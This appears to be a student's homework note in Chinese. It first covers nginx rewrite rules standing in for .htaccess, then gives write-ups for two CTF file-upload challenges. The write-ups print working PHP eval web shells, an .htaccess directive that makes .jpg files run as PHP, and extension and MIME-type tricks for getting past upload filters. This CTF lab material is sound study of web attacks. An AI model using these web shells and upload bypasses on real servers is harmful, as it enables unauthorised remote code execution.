3.6作业



## 查找nginx能够实现.htaccess功能的文件及文件写法

1.在.htaccess里面写入

\# nginx rewrite rule

rewrite ^(.*?)/article/.*?-(d+)-(d+).html$ $1/show.html?id=$2&page=$3  break;

rewrite ^(.*?)/category/.*?-(d+)-(d+).html$ $1/list.html?id=$2&page=$3  break;

rewrite ^(.*?)/tag/([^/]+)/?$ $1/tag.html?w=$2  break;

rewrite ^(.*?)/tag/([^/]+)/(d+)$  $1/tag.html?w=$2&page=$3  break;

\# end nginx rewrite rule

保存在网站根目录下

2. 在nginx的配置文件的server块中引入.htaccess文件：include /usr/www/.htaccess
3. 重启nginx



# 经典题

共两道，复制到浏览器粘贴。

**第一道：**

https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Upload

题目提示上传图片，上传一张图片试试，发现可以，尝试上传.htaccess，发现不行，把一句话木马改成.phtml后缀，发现上传成功！使用蚁剑连接获取flag（后来又试了一下，发现应该过滤了php标签）

一句话木马内容：

GIF89a

<script language='php'>eval($_POST['cmd']);</script>

**第二道：**

https://buuoj.cn/challenges#[MRCTF2020]%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2

上传普通的一句话木马，发现通不过，改后缀成jpg通不过，类型改成image/jpeg，通过了，再尝试上传.htaccess通过了，通过蚁剑连接，在根目录下找到flag

一句话木马：

<?php @eval($_POST['a']); ?>

.htaccess内容：

AddType application/x-httpd-php .jpg
